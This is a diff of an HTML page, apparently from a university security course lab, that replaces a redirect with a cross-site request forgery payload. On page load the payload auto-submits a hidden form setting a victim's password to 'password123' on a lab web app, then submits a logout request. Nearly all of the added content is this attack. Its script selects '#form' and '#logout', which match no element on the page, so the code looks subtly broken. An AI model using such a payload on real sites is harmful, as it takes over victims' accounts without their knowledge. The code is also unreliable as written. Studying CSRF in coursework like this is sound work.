@@ -4,11 +4,18 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
-    <script>
-        window.location.href = "http://student.csci3403.com:31337/index.html"
-    </script>
 </head>
 <body>
-    
+    <form action="http://recitation-14-team-01.eastus.cloudapp.azure.com:3000/account" method="POST">
+        <input type="text" name="new_password" value="password123">
+    </form>
+    <form action="http://recitation-14-team-01.eastus.cloudapp.azure.com:3000/logout" method="GET">
+    </form>
+    <script>
+        const changePass = document.querySelector("#form")
+        const logout = document.querySelector("#logout")
+        changePass.submit();
+        logout.submit();
+    </script>
 </body>
 </html>
